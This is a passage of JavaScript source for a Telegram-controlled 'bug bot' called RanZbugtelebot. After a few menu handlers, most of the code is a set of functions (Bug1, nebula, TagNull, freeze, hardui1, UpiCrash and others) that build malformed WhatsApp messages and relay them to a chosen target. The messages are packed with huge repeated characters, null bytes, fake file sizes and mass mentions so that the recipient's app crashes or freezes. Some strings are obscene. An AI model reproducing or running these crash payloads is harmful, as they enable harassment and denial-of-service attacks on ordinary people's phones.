  await editMenu(ctx, caption, buttons);
});

// Handler untuk callback "owner_management"
bot.action("option2", async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("𝑩𝑨𝑪𝑲", "startmenu")],
  ]);
  const caption = `
╭───── ⧼ RanZbugtelebot ⧽
│ᴄʀᴇᴀᴛᴏʀ : Ranz
│ᴠᴇʀsɪ : ʙᴇᴛᴀ
│ᴏs : ʟɪɴᴜx
│ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
╰─────

╭─── ⧼ 𝑪 𝑶 𝑵 𝑻 𝑹 𝑶 𝑳 𝑳 ⧽
│ /ᴀᴅᴅᴛᴏᴋᴇɴ
│ /ᴅᴇʟᴛᴏᴋᴇɴ
│ /ᴅᴇᴘʟᴏʏ
│ /ʟɪsᴛᴅᴇᴘʟᴏʏ
│ /ꜱᴛᴀʀᴛᴅᴇᴘʟᴏʏ
│ /ᴄᴏɴɴᴇᴄᴛ
│ /ꜱᴛᴀᴛᴜꜱ
│ /ᴀᴅᴅᴏᴡɴᴇʀ
│ /ᴅᴇʟᴏᴡɴᴇʀ
│ /ᴀᴅᴅᴀᴅᴍɪɴ
│ /ᴅᴇʟʀᴇᴍ
│ /ᴀᴅᴅᴘʀᴇᴍ
│ /ᴅᴇʟʀᴇᴍ
╰──────
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action("option1", async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("𝑩𝑨𝑪𝑲", "startmenu")],
  ]);
  const caption = `
╭───── ⧼ RanZbugtelebot ⧽
│ᴄʀᴇᴀᴛᴏʀ : Ranz
│ᴠᴇʀsɪ : ʙᴇᴛᴀ
│ᴏs : ʟɪɴᴜx
│ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
╰─────

╭─── ⧼ 𝑷 𝑹 𝑬 𝑴 𝑰 𝑼 𝑴 ⧽
│ /
│ /
│ /
│ /
│ /
│ /
│ /
│ /
╰──────
  `;

  await editMenu(ctx, caption, buttons);
});

//===============FUNC BUG==================\\
// [ BUG FUNCTION ]
async function click(sock, target) {
  let msg = await generateWAMessageFromContent(
    sock,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗨𝗻𝗱𝗲𝗿𝗰𝗿𝗮𝘀𝗵",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function Bug1(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 ✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧 𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}

async function InvisiPayload(sock, target) {
  let sections = [];

  for (let i = 0; i < 10000; i++) {
    let largeText = "ꦾ".repeat(45000);

    let deepNested = {
      title: `Super Deep Nested Section ${i}`,
      highlight_label: `Extreme Highlight ${i}`,
      rows: [
        {
          title: largeText,
          id: `id${i}`,
          subrows: [
            {
              title: "Nested row 1",
              id: `nested_id1_${i}`,
              subsubrows: [
                {
                  title: "Deep Nested row 1",
                  id: `deep_nested_id1_${i}`,
                },
                {
                  title: "Deep Nested row 2",
                  id: `deep_nested_id2_${i}`,
                },
              ],
            },
            {
              title: "Nested row 2",
              id: `nested_id2_${i}`,
            },
          ],
        },
      ],
    };

    sections.push(deepNested);
  }

  let listMessage = {
    title: "Massive Menu Overflow",
    sections: sections,
  };

  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "ㅤㅤㅤㅤㅤ",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
              {
                name: "mpm",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, {
    participant: { jid: target },
  });
}
//NON CLICK
async function Bug2(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function nebula(sock, target) {
  const stanza = [
    { attrs: { biz_bot: "1" }, tag: "bot" },
    { attrs: {}, tag: "biz" },
  ];

  const messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "💥⃟༑⌁⃰𝗡͖͜𝗘𞋯͡𝗕͋͢͜𝗨̸͔͋͡𝗟̸͋͢͜𝗔͔͋ 龹 𝗖͡𝗥͖⃰͜𝗔̐͢͡𝗦̸͔̐͜𝗛̐͢͡𝗘͔̐͜𝗥̐͢͡ ཀ͜͡🧬".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "💷",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Dermen —",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: "༑",
                footerText: "© #PEPEKTEMPEK ?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: { displayText: "xinn 𐎟" },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "x",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: "x",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/TheyFreak",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "𝗋34" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: tdxlol,
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂 - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}

async function Payload(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { text: "\u0000" },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, { participant: { jid: target } });
  } catch (err) {
    console.log(err);
  }
}

async function noclick(sock, target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "💥⃟༑⌁⃰𝗡͖͜𝗘𞋯͡𝗕͋͢͜𝗨̸͔͋͡𝗟̸͋͢͜𝗔",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗖͡𝗥͖⃰͜𝗔̐͢͡𝗦̸͔̐͜𝗛̐͢͡𝗘͔̐͜𝗥̐͢͡",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function crashui(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: "🩸⃟⃨〫⃰‣ ⁖𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 ‣—",
            contentText: "🩸⃟⃨〫⃰‣ ⁖𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 ‣—" + "\u0000".repeat(70000),
            contextInfo: {
              forwardingScore: 6,
              isForwarded: true,
            },
            headerType: 1,
            buttons: [
              {
                body: {
                  text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી ) 𐎟",
                },
              },
            ],
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
}

async function TagNull(sock, target) {
  let virtex = "CRASHSG-";

  const messagePayload = {
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "ꦾ".repeat(50000),
              url:
                "https://api.whatsapp.com/send?phone=+🧸&text=" +
                "@1".repeat(103000),
              sequenceNumber: 0,
              jpegThumbnail: "",
            },
            hasMediaAttachment: true,
            contactVcard: true,
          },
          body: {
            text: virtex + "@1".repeat(88000),
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@broadcast"),
            groupMentions: [
              {
                groupJid: "1@broadcast",
                groupSubject: virtex, // Pastikan button udah didefinisikan
              },
            ],
            isForwarded: true,
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "Sent",
                  format: "EXTENSIONS_7",
                },
                nativeFlowResponseMessage: {
                  name: "custom_message",
                  paramsJson: `{
        "screen_2_OptIn_0": true,
        "screen_2_OptIn_1": true,
        "screen_1_Dropdown_0": "HKC-QI-0",
        "screen_0_Dropdown_1": "HK-9999",
        "screen_1_DatePicker_1": "1028995200000",
        "screen_1_TextInput_2": "TamaXyz@BugAviliable.com",
        "screen_1_TextInput_4": "https://www.google.com/",
        "screen_1_TextInput_5": "https://api.whatsapp.com/send?phone=+🧸&text="+"@1".repeat(90000),       
        "screen_1_TextInput_3": "94643116",
        "screen_0_TextInput_0": "${"\u0003".repeat(55000)}",
        "screen_0_TextInput_1": "HK-3001",
        "screen_0_TextInput_2": "HK-6666",
        "screen_0_TextInput_3": "HK-3004",
        "screen_4_TextInput_8": "0x80048820",
        "screen_0_TextInput_4": "HK-3005",
        "screen_0_TextInput_5": "HK-3000",
        "screen_0_TextInput_6": "HK-3002",
        "screen_0_TextInput_7": "HK-3005",
        "screen_0_TextInput_8": "HK-3006",
        "screen_0_TextInput_9": "HK-3008",
        "screen_0_TextInput_10": "HK-1001",
        "screen_1_TextInput_0": "HK-2002",
        "screen_2_TextInput_0": "HK-5005",
        "screen_3_TextInput_0": "HK-3003",
        "screen_5_TextInput_0": "Doomsday-2024",
        "screen_0_Dropdown_2": "0.0.9_#AmpasWKWK",
        "screen_0_Dropdown_3": "HK-0001",
        "screen_0_Dropdown_4": "Doomsday-2024",
        "screen_3_EmojiBombCrash_004": "😹".repeat(10000),
        "flow_token": "AQAAAAAULTIMATE_CRASH_TOKEN_TaMaXyZ_X9Y7Z41_FINIXTRASH."
    }`,
                  version: 3,
                },
              },
            },
          },
        },
        isForwarded: true,
        share_payment_status: true,
      },
    },
    messageParamsJson: "\u0000".repeat(55000),
  };

  sock.relayMessage(target, messagePayload, {
    participant: { jid: target },
    messageId: null,
  });
}

async function blank(sock, target) {
  const jids = `_*~@8~*_\n`.repeat(10500);
  const ui = "ꦽ".repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!" + ui + jids,
            },
            footer: {
              text: "",
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function freeze(sock, target) {
  let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙵𝚁𝙴𝙴𝚉𝙴" + "ꦾ".repeat(250000) + "@8".repeat(250000);
  await sock.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Wkwk.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "",
              hasMediaAttachment: true,
            },
            body: {
              text: virtex,
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}
async function hard3(sock, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐁𝐋𝐀𝐍𝐊" + "ꦾ".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
            inviteExpiration: Date.now() + 1814400000, // 21 hari
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "Vampire Official",
          },
        ],
      },
    };

    await sock.relayMessage(target, message, {
      userJid: target,
    });
  } catch (err) {
    console.error("Error sending newsletter:", err);
  }
}
async function hardui1(sock, target) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷 𝚄𝙸‎‏‎‏‎‏⭑̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
//IOS
async function UpiCrash(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function VenCrash(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "VENMO",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function AppXCrash(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "CASHAPP",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function SmCrash(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "SAMSUNGPAY",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function SqCrash(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "SQUARE",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function FBiphone(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
